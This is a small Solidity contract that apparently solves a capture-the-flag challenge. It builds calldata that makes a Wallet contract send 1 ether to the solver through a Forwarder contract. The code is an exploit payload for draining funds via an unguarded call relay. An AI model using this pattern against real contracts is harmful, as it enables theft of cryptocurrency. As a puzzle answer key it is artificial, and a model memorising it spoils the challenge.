// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "./Forwarder.sol";

contract SolveForwarder {
    // you are the receiver
    function getFuncSig(address receiver) external pure returns (bytes memory) {
        return abi.encodeCall(Wallet.sendEther, (receiver, 1 ether));
    }
}
